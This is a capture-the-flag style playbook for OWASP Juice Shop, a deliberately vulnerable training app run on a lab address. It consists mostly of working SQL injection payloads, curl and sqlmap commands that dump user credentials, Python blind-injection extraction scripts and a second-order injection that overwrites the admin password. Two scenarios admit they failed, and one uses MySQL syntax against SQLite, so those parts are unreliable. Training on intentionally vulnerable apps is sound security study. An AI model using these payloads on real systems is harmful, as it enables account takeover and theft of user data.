# OWASP Juice Shop: All Challenges & Solutions Playbook

This playbook summarizes the main challenge categories and solutions for OWASP Juice Shop, with step-by-step instructions and example commands/scripts. For full details, always refer to the official [Pwning OWASP Juice Shop](https://pwning.owasp-juice.shop/) book.

---

## 1. Injection Attacks

### SQL Injection Scenario 1: Login Bypass (Admin Account)

**Objective:** Bypass login authentication to access admin account

**Steps:**

1. Navigate to `http://10.30.0.237:3000/#/login`
2. In the email field, enter: `admin@juice-sh.op' OR 1=1--`
3. In the password field, enter any value (e.g., `password`)
4. Click "Log in"
5. You should be logged in as the admin user

**Manual Command:**

```zsh
# Install jq if not already installed
wget -O jq https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
sudo chmod +x ./jq
sudo cp jq /usr/bin

# Get JWT token
TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}' | jq -r '.authentication.token')

# Use the token in Bearer Authorization header for all further requests
curl -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "http://10.30.0.237:3000/rest/user/whoami"
```

**SQLMap Command (Automated with Bearer Token):**

```zsh
# Install jq if not already installed
wget -O jq https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
sudo chmod +x ./jq
sudo cp jq /usr/bin

TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}' | jq -r '.authentication.token')

sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
  --headers="Authorization: Bearer $TOKEN" \
  --headers="Content-Type: application/json" \
  --dbms=sqlite --technique=BEU --level=5 --risk=3 \
  --batch --dump
```

### SQL Injection Scenario 2: Product Search Injection

**Objective:** Extract database information through search functionality

**Steps:**

1. Go to the main page search bar
2. Enter: `apple' UNION SELECT null,email,password,null,null,null,null,null,null FROM Users--`
3. Press Enter to search
4. Check the response for exposed user data

**Manual Command:**

```zsh
curl "http://10.30.0.237:3000/rest/products/search?q=apple%27%20UNION%20SELECT%20null,email,password,null,null,null,null,null,null%20FROM%20Users--"
```

**SQLMap Command (with Bearer Token):**

```zsh
TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}' | jq -r '.authentication.token')

sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=apple" \
  --headers="Authorization: Bearer $TOKEN" \
  --headers="Content-Type: application/json" \
  --dbms=sqlite --technique=U --level=5 --risk=3 \
  --tables --batch
```

### SQL Injection Scenario 3: Order Tracking Injection

**Objective:** Access all order information through order tracking

**Steps:**

1. Go to `http://10.30.0.237:3000/#/track-result`
2. In the tracking ID field, enter: `1' OR '1'='1`
3. Click "Track"
4. Observe all orders being displayed

**Manual Command:**

```zsh
curl -X GET "http://10.30.0.237:3000/rest/track-order/1%27%20OR%20%271%27=%271" \
  -H "Accept: application/json"
```

### SQL Injection Scenario 4: Boolean-Based Blind SQL Injection

**Note:** This scenario did not work as expected in the current Juice Shop version. The application may not be vulnerable to boolean-based blind SQLi via this vector.

**Objective:** Extract database information using boolean-based blind techniques

**Steps:**

1. Navigate to the product search
2. Test true condition: `apple' AND '1'='1--`
3. Test false condition: `apple' AND '1'='2--`
4. Compare responses to identify blind SQL injection
5. Use binary search to extract data:
   - `apple' AND (SELECT LENGTH(email) FROM Users WHERE id=1)>10--`
   - `apple' AND (SELECT SUBSTR(email,1,1) FROM Users WHERE id=1)='a'--`

**Python Script for Boolean-Based Extraction:**

```python
#!/usr/bin/env python3
import requests
import string

def blind_sqli_extract(url, payload_template):
    """Extract data using boolean-based blind SQL injection"""
    result = ""
    position = 1

    while True:
        found_char = False
        for char in string.printable:
            if char in ['%', '_', '\\']: # Skip SQL wildcards
                continue

            payload = payload_template.format(position=position, char=char)
            response = requests.get(f"{url}?q={payload}")

            # Check if response indicates true condition
            if len(response.json().get('data', [])) > 0:
                result += char
                position += 1
                found_char = True
                print(f"Found character: {char} (Position: {position-1})")
                break

        if not found_char:
            break

    return result

# Usage example
url = "http://10.30.0.237:3000/rest/products/search"
payload = "apple' AND (SELECT SUBSTR(email,{position},1) FROM Users WHERE id=1)='{char}'--"
extracted_email = blind_sqli_extract(url, payload)
print(f"Extracted email: {extracted_email}")
```

### SQL Injection Scenario 5: Time-Based Blind SQL Injection

**Note:** This scenario did not work as expected in the current Juice Shop version. The application may not be vulnerable to time-based blind SQLi via this vector.

**Objective:** Confirm SQL injection using time delays

**Steps:**

1. Go to product search
2. Enter payload that causes delay: `apple'; SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sqlite_master) ELSE 0 END--`
3. Measure response time difference
4. Use timing to extract data bit by bit

**Manual Command:**

```zsh
# Test time-based injection (SQLite doesn't have SLEEP, use heavy query)
curl -w "Time: %{time_total}s\n" \
  "http://10.30.0.237:3000/rest/products/search?q=apple%27%3B%20SELECT%20COUNT%28%2A%29%20FROM%20sqlite_master%20WHERE%20tbl_name%20LIKE%20%27%25%27--"
```

**Time-Based Extraction Script:**

```python
#!/usr/bin/env python3
import requests
import time

def time_based_sqli(url, true_payload, false_payload):
    """Test for time-based SQL injection"""

    # Test baseline
    start = time.time()
    requests.get(f"{url}?q=apple")
    baseline = time.time() - start

    # Test true condition (should be slower)
    start = time.time()
    requests.get(f"{url}?q={true_payload}")
    true_time = time.time() - start

    # Test false condition (should be faster)
    start = time.time()
    requests.get(f"{url}?q={false_payload}")
    false_time = time.time() - start

    print(f"Baseline time: {baseline:.3f}s")
    print(f"True condition time: {true_time:.3f}s")
    print(f"False condition time: {false_time:.3f}s")

    if true_time > (baseline * 2):
        print("Time-based SQL injection detected!")
        return True
    return False

# Usage
url = "http://10.30.0.237:3000/rest/products/search"
true_payload = "apple'; SELECT COUNT(*) FROM sqlite_master WHERE tbl_name LIKE '%'--"
false_payload = "apple'; SELECT COUNT(*) FROM sqlite_master WHERE tbl_name LIKE 'nonexistent'--"
time_based_sqli(url, true_payload, false_payload)
```

### SQL Injection Scenario 6: Second-Order SQL Injection

**Objective:** Exploit stored SQL injection through user registration

**Steps:**

1. Register a new user with malicious email: `test'; UPDATE Users SET password='hacked' WHERE email='admin@juice-sh.op'--@test.com`
2. Complete registration process
3. The malicious SQL may execute when the email is processed internally
4. Try logging in as admin with password 'hacked'

**Registration Command (Combined UPDATE and INSERT):**

```zsh
curl -X POST "http://10.30.0.237:3000/api/Users/" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test'\'' UPDATE Users SET password='\''c8d15d6f49780e0f7841278759b12cbc'\'' WHERE email='\''admin@juice-sh.op'\''; INSERT INTO Users (email,password) VALUES ('\''hacker@test.com'\'','\''password'\'')--@test.com",
    "password": "password123",
    "passwordRepeat": "password123",
    "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?", "createdAt": "2024-01-01", "updatedAt": "2024-01-01"},
    "securityAnswer": "test"
  }'
```

**Verification:**

```zsh
# After the second-order injection, try logging in as admin with password 'hacked'
curl -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"hacked"}'

# Also try logging in as the injected user
curl -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@test.com","password":"password"}'
```

### SQL Injection Scenario 7: Error-Based SQL Injection

**Objective:** Extract information through SQL error messages

**Steps:**

1. Go to product search
2. Enter payload to trigger SQL errors: `apple' AND EXTRACTVALUE(1, CONCAT('~', (SELECT email FROM Users LIMIT 1)))--`
3. Check error messages for leaked data
4. For SQLite, use: `apple' AND (SELECT CASE WHEN 1=1 THEN 1/0 ELSE 1 END)--`

**Error-Based Commands:**

```zsh
# Test for SQL errors
curl "http://10.30.0.237:3000/rest/products/search?q=apple%27%20AND%20%281%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%29%29--"

# SQLite specific error injection
curl "http://10.30.0.237:3000/rest/products/search?q=apple%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201/0%20ELSE%201%20END%29--"
```

### Complete SQLMap Automation Guide

**1. Basic Database Enumeration (with Bearer Token):**

```zsh
TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}' | jq -r '.authentication.token')

# Enumerate databases
sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
  --headers="Authorization: Bearer $TOKEN" \
  --headers="Content-Type: application/json" \
  --dbms=sqlite --dbs --batch

# Enumerate tables
sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
  --headers="Authorization: Bearer $TOKEN" \
  --headers="Content-Type: application/json" \
  --dbms=sqlite --tables --batch

# Enumerate columns for Users table
sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
  --headers="Authorization: Bearer $TOKEN" \
  --headers="Content-Type: application/json" \
  --dbms=sqlite -T Users --columns --batch
```

**2. Data Extraction (with Bearer Token):**

```zsh
# Dump all Users table data
sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
  --headers="Authorization: Bearer $TOKEN" \
  --headers="Content-Type: application/json" \
  --dbms=sqlite -T Users --dump --batch

# Dump specific columns
sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
  --headers="Authorization: Bearer $TOKEN" \
  --headers="Content-Type: application/json" \
  --dbms=sqlite -T Users -C email,password --dump --batch
```

**3. Advanced SQLMap Options (with Bearer Token):**

```zsh
sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=test" \
  --headers="Authorization: Bearer $TOKEN" \
  --headers="Content-Type: application/json" \
  --dbms=sqlite --level=5 --risk=3 \
  --technique=BEUSTQ --batch --threads=4
```

# All other SQLMap and curl commands should use the Bearer token as shown above.
